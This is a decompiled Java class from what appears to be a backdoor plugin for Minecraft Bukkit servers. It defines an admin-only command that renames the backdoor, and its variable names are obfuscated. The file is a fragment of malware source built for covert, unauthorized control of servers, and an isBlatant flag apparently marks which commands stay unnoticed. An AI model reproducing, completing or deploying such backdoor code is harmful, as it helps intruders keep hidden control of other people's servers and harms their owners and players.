/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class SetbackdoornameCommand
extends Command {
    public SetbackdoornameCommand() {
        SetbackdoornameCommand llllllllllllllIlIIlIIlIllIlIIlll;
    }

    @Override
    public void execute(Core llllllllllllllIlIIlIIlIllIlIIIlI, String llllllllllllllIlIIlIIlIllIlIIIIl, String[] llllllllllllllIlIIlIIlIllIIlllIl, Player llllllllllllllIlIIlIIlIllIIlllll) {
        if (llllllllllllllIlIIlIIlIllIlIIIlI.admin.contains(llllllllllllllIlIIlIIlIllIIlllll.getName())) {
            if (llllllllllllllIlIIlIIlIllIIlllIl.length <= 1) {
                llllllllllllllIlIIlIIlIllIIlllll.sendMessage(Settings.USAGE("setname <new backdoor name>"));
                llllllllllllllIlIIlIIlIllIIlllll.sendMessage(Settings.PREFIX("Backdoor names can only be one attached word, and they cannot have color codes!"));
            } else {
                Settings.NAME = llllllllllllllIlIIlIIlIllIIlllIl[1];
                llllllllllllllIlIIlIIlIllIIlllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The new backdoor name is now ").append(llllllllllllllIlIIlIIlIllIIlllIl[1]))));
            }
        } else {
            llllllllllllllIlIIlIIlIllIIlllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("admin ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

